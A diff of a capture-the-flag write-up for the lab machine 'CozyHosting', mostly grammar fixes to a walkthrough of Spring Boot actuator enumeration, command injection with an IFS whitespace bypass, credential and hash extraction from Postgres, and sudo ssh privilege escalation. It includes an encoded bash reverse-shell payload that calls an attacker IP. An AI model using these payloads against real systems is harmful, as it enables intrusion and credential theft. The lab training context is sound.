@@ -3,7 +3,7 @@ title: Writeup CozyHosting
 published: 2024-06-10
 description: 'Writeup of linux machine "CozyHosting" from HTB'
 image: 'CozyHosting.png'
-tags: [CTF, HTB, Linux, Spring Boot, Postgres, Command Injection, Java, Sudo]
+tags: [CTF, HTB, Linux, Spring Boot, PostgresSQL, Command Injection, Java, Sudo]
 category: 'CTF writeup'
 draft: true
 ---
@@ -16,7 +16,7 @@ draft: true
 
 # Enumeration
 
-First I run `nmap` to find all services that is open on the machine.
+First, I ran `nmap` to find all services that are open on the machine.
 
 ```bash
 ❯ nmap -p- -sV -sC -oA nmap/tcp --min-rate=1000 -v 10.10.11.230
@@ -29,7 +29,7 @@ PORT   STATE SERVICE VERSION
 ...
 ```
 
-Going to the webpage and adding `cozyhosting.htb` to my `/etc/hosts` file we can find this nice webpage of __Figure 1__. Openning the login page, the site ask me the username and password, tried some defaults one like `admin:admin` but without success.
+After going to the webpage and adding `cozyhosting.htb` to my `/etc/hosts` file, we find this nice webpage as shown in __Figure 1__. Opening the login page, the site ask for a username and password. I tried some default ones like `admin:admin`, but without success.
 
 ![Pic 1](./homepage.png)
 > _Figure 1_: **Home Page.**
@@ -37,7 +37,7 @@ Going to the webpage and adding `cozyhosting.htb` to my `/etc/hosts` file we can
 ![Pic 2](./login.png)
 > _Figure 2_: **Login page.**
 
-With no more informations I started **brute forcing** the webpage to find files and directories with `ffuf`. 
+With no more informations, I started **brute forcing** the webpage to find files and directories with `ffuf`. 
 ```
 ffuf -w $smallw -u http://cozyhosting.htb/FUZZ
 index                   [Status: 200]
@@ -49,19 +49,19 @@ error                   [Status: 500]
 :::information
 The bash `$smallw` thing is a variable to `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt`. I have all lot of wordlists on my `.zshrc` file to made this `ffuf` commands more easy to read and write. 
 :::
-The more interesting one is the `/admin` but it just give me the **Unauthorized** status code and redirect to `/login`. The other one that come to my attention is `/error`, it return the folowing error message:
+The most interesting one is the `/admin`, but it just gives me the **Unauthorized** status code and redirects to `/login`. Another one that caught my attention is `/error`, which returns the folowing error message:
 
 ![Pic 3](./whitelabel_error.png)
 > _Figure 3_: **Whitelabel error.**
 
 # Foothold
 
-I search the error message on _Google_ and discover that it is a common error on **Spring Boot**.
+I searched the error message on _Google_ and discovered that it is a common error on **Spring Boot**.
 
 ![Pic 4](./spring_boot.png)
 > _Figure 4_: **Spring Boot error.**
 
-With that in mind I ran `ffuf` again but this time with a proper wordlist for **spring_boot**. We actually find all the following endpoits and making a get request to `/actuator` the server send back **all the endpoints** under `/actuator`.
+With that in mind, I ran `ffuf` again, but this time with a proper wordlist for **Spring_Boot**. We found the following endpoits, and by making a **GET** request to `/actuator`, the server send back **all the endpoints** under `/actuator`.
 ```bash
 ffuf -u http://cozyhosting.htb/FUZZ -w $seclist/Discovery/Web-Content/spring-boot.txt -o fuzz
 ❯ cat fuzz | jq '.results[].url'
@@ -89,7 +89,7 @@ ffuf -u http://cozyhosting.htb/FUZZ -w $seclist/Discovery/Web-Content/spring-boo
 > In essence, Actuator brings production-ready features to our application.
 Monitoring our app, gathering metrics, and understanding traffic or the state of our database becomes trivial with this dependency.
 
-A lot of endpoints to check lets go to the more interesting ones.</br> 
+There are a lot of endpoints to check, so let's start with the more interesting ones.</br> 
 The `/actuator/env` or `/actuator/env/*` seems to return return some envirement variables, but all values is censored to `******`. </br>
 The `/actuator/mappings` returns a json with **all endpoints** of the website. 
 
@@ -115,7 +115,7 @@ The `/actuator/mappings` returns a json with **all endpoints** of the website.
 "/**"
 ```
 
-The `POST` to `/executessh` come to my attention, but when I tried send the **request** it **returns** the http code _400 Bad Request_. Maybe it is expecting parameters? So I tried to **brute force** it again with `ffuf` but **don't find anything**.
+The `POST` to `/executessh` caught my attention, but when I tried sending the **request**, it **returned** the http code _400 Bad Request_. Maybe it is expecting parameters? So I tried to **brute force** it again with `ffuf` but **don't find anything**.
 
 `ffuf -u http://cozyhosting.htb/executessh -X POST -w $seclist/Discovery/Web-Content/api/actions.txt -mc all -d 'FUZZ=sleep 5' -ft '<900'`
 
@@ -134,19 +134,19 @@ __Figure 6__ Demostrated a __match and replace__ rule on **Caido proxy** to chan
 
 ## Command Injection
 
-I put some normal inputs on the **Hostname** and **Username** and still getting the following error on _Figure 8__.
+I entered some normal inputs for **Hostname** and **Username** and still got the following error, as shown in _Figure 8__.
 
 ![Pic 8](./host_not_added.png)
 > _Figure 8_: **Error: verification failed.**
 
-I expect it to be running some bash command like `ssh $USER@$HOSTNAME` in the backend. So I need to find out what is the protections they are using and bypassing it to the a reverse shell.
+I suspected it was running a bash command like `ssh $USER@$HOSTNAME` in the backend. So I need to find out what is the protections they are using and bypassing it to the a reverse shell.
 
-The request is the `POST` to `/executessh` that I see before and don't find anything brute forcing it. Now I can see that the request needed a `host` and `username` parameters to function normally. When I tried to send this basic command injection payload(`;sleep 5;`) on the parameter `host`, the server returns `Invalid hostname!` as we can see in __Figure 8__. 
+The request is the `POST` to `/executessh` that I saw before but don't find anything while brute forcing it. Now I can see that the request needed a `host` and `username` parameters to function normally. When I tried sending this basic command injection payload(`;sleep 5;`) in the `host` parameter, the server returned `Invalid hostname!`, as shown in __Figure 9__. 
 
 ![Request and response of `/executessh`](./invalid_hostname.png)
 > _Figure 9_: **Request and response of `/executessh`.**
 
-But when I send the same payload on the username it returns the error message '__Username can't contain whitespaces!__'. I can use the BASH variable **IFS** to bypass this whitespace protection. Sending the payload `;sleep${IFS}5` The server actually wait 5 seconds to return a response.
+However, when I send the same payload on the username parameter, it returned the error message '__Username can't contain whitespaces!__'. I can use the _BASH_ variable **IFS** to bypass this whitespace restriction. Sending the payload `;sleep${IFS}5` The server actually wait 5 seconds to return a response.
 >  “**IFS**” (Internal Field Separator) is a special variable that defines the character or characters used to **separate** a pattern into tokens for some operations.
 
 ![Sleep 5](./sleep_5.png)
@@ -167,7 +167,7 @@ PAYLOAD=";echo${IFS}YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTYvNDQzICAwPiYxICAK
 
 ## Reading .jar file
 
-I get a shell as the user `app` on the folder `/app` and inside this folder. I have the file named _'cloudhosting-0.0.1.jar'_ this is probally the source code that is running on the webpage, to be sure about that I started enumerate all the ports open.
+I got a shell as the user `app` on the folder `/app` and inside this folder. I have the file named _'cloudhosting-0.0.1.jar'_ this is probally the source code that is running on the webpage, to be sure about that I started enumerate all the ports open.
 
 ```bash
 # List the open ports on the machine to identify the webserver
@@ -211,7 +211,7 @@ server {
 	}
 }
 ```
-The port `8080` is actually running that `.jar` file and it is really the file running the webserver. So lets unzip it and search for some database credentials inside it.
+The port `8080` is actually running that `.jar` file, confirming it is really the file running the webserver. So let's unzip it and search for some database credentials inside.
 
 ```bash
 mkdir /tmp/src
@@ -224,14 +224,14 @@ grep -ri 'password'
 ![grep](./db_grep_command.png)
 > _Figure 13_: **Return of grep command.**
 
-With this command we can read the contents of the file `BOOT-INF/classes/application.properties` and find the PostGres credentials.
+With this command, we can read the contents of the file `BOOT-INF/classes/application.properties` and find the PostgresSQL credentials.
 
 ![cat file](./db_creds.png)
 > _Figure 14_: **Database credentials.**
 
 ## PostGres database
 
-After trying the password to login as the user `josh` and it don't work. I got back to the port enumeration part, the port `5432` is **open**. This is the **default port** for postgres database. The utility `psql` let us interact with the Postgres database, so I use it to connect and extract the hashes.
+After trying the password to log in as the user `josh` and it didn't work. I got back to the port enumeration part, the port `5432` is **open**. This is the **default port** for postgres database. The utility `psql` lets us interact with the PostgresSQL database, so I used it to connect and extract the hashes.
 
 ```sql
 # List all schemas
@@ -248,7 +248,7 @@ SELECT * FROM users;
 ![Hashs](./hashes.png)
 > _Figure 15_: **Hashes inside Database.**
 
-Copying only the hashes and put it in a file named `hashes.txt` and ran the command `hashcat hashes.txt $rockyou -m 3200` will give me a clear text password after some time running. 
+Copying only the hashes and putting them in a file named `hashes.txt`, I ran the command `hashcat hashes.txt $rockyou -m 3200`, which gave me a clear text password after some time. 
 
 ![hashcat](./hashcat.png)
 > _Figure 16_: **Hashcat command.**
@@ -257,7 +257,7 @@ With the password we can just `su - josh` and get a shell as the user `josh`.
 
 # Privilege Escalation
 
-Running the command `sudo -l` to identify if we can run any commands as root. It returns that we can use `ssh` as _root_ user. Searching on [gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo) I find that we can use the ProxyCommand option to the a shell as root.
+I ran the command `sudo -l` to identify if we could run any commands as root. It returns that we can use `ssh` as _root_ user. Searching on [gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo), I find that we can use the ProxyCommand option to the a shell as root.
 
 ![Root](./root.png)
 > _Figure 17_: **Getting root.**
